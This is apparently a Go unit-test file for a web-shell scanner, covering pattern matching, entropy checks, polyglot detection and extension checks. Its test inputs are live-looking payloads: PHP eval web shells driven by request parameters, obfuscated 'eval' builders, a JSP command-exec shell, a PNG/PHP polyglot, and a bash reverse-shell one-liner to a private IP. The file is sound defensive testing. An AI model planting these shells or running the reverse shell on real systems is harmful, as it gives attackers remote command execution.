package web

import (
	"strings"
	"testing"
)

func TestMatchingPatterns_ConcatObfuscation(t *testing.T) {
	// Concatenated sink name inside call_user_func should match after collapseStringConcat.
	m := matchingPatterns(`<?php call_user_func("ev"."al", $_GET['c']);`)
	if !contains(m, "call_user_func_eval") {
		t.Fatalf("expected call_user_func_eval after concat collapse, got %v", m)
	}
}

func TestMatchingPatterns_IgnoresCommentedSource(t *testing.T) {
	m := matchingPatterns(`<?php // eval($_GET['c']); echo "ok";`)
	if contains(m, "dynamic_eval") {
		t.Fatalf("expected eval hidden in // comment to be stripped before matching; got %v", m)
	}
}

func TestMatchingPatterns_Jsp(t *testing.T) {
	m := matchingPatterns(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`)
	if !contains(m, "jsp_runtime_exec") {
		t.Fatalf("expected jsp_runtime_exec, got %v", m)
	}
}

func TestMatchingPatterns_ChrChain(t *testing.T) {
	m := matchingPatterns(`<?php $x=chr(101).chr(118).chr(97).chr(108).chr(40);`)
	if !contains(m, "chr_chain") {
		t.Fatalf("expected chr_chain, got %v", m)
	}
}

func TestMatchingPatterns_Bash(t *testing.T) {
	m := matchingPatterns(`bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`)
	if !contains(m, "bash_reverse_shell") {
		t.Fatalf("expected bash_reverse_shell, got %v", m)
	}
}

func TestShannonEntropy_LowOnText(t *testing.T) {
	h := shannonEntropy([]byte(strings.Repeat("abc", 200)))
	if h >= 3 {
		t.Fatalf("expected low entropy, got %v", h)
	}
}

func TestMagicByteMismatch_PNGWithPHP(t *testing.T) {
	data := []byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'}
	data = append(data, []byte("\x00\x00\x00\x0d<?php eval($_GET['x']);")...)
	if !magicByteMismatch("/tmp/image.png", data) {
		t.Fatal("expected polyglot detection")
	}
}

func TestMagicByteMismatch_HiddenPHPInTxt(t *testing.T) {
	if !magicByteMismatch("/srv/www/notes.txt", []byte("<?php eval($_POST['c']);")) {
		t.Fatal("expected hidden-php detection in .txt")
	}
}

func TestHasSuspiciousExtension(t *testing.T) {
	cases := map[string]bool{
		"/a/b.PHP":   true,
		"/a/b.jspx":  true,
		"/a/b.aspx":  true,
		"/a/b.html":  false,
		"/a/b.ashx":  true,
		"/a/b.Phar":  true,
	}
	for p, want := range cases {
		if got := hasSuspiciousExtension(p); got != want {
			t.Errorf("%s: got %v want %v", p, got, want)
		}
	}
}

func contains(haystack []string, needle string) bool {
	for _, h := range haystack {
		if h == needle {
			return true
		}
	}
	return false
}
